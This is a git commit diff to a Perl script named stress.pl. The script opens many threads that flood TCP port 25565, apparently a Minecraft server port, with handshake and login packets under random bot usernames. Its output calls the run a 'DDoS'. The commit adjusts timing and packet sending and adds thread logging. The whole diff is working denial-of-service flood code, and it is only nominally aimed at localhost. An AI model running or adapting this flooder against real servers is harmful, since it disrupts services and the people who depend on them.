f73865986b01190639b8612a548a72cee38bbac6
Agatka <polietaiev2000@gmail.com>
2017-12-21 16:14:57 +0300

    Update stress.pl

--- stress.pl
+++ stress.pl
@@ -4,22 +4,24 @@ $host = '127.0.0.1';
 $port = 25565;
 $thread = 150;
 $protocol = chr(47);
+$time_ddos = 20;
 $connects = 0;
 for ($i=0;$i<=$thread;$i++){
     threads->new(\&new_bot);
+	print "Starting $i thread\n";
 }
-sleep 10;
+sleep $time_ddos;
 print "DDoS stopped";
 exit(0);
 sub new_bot
 {
+    sleep 5;
     while (1) {
+	    $connects += 1;
         socket($sock, AF_INET, SOCK_STREAM, getprotobyname('tcp'));
         connect($sock , sockaddr_in($port, inet_aton($host)));
-        $connects += 1;
-        $username = 1111111111 + int(rand(9999999999 - 1111111111));
-        send($sock , "\x06\x00$protocol\x00\x00\x00\x02" , 0);
-        send($sock , "\x0c\x00\n$username", 0);
+        $username = 1000000000 + int(rand(9999999999 - 1000000000));
+        send($sock , "\x06\x00$protocol\x00\x00\x00\x02\x0c\x00\n$username" , 0);
         print "[$username/$connects]\n";
         sleep(0.01);
         close($sock);
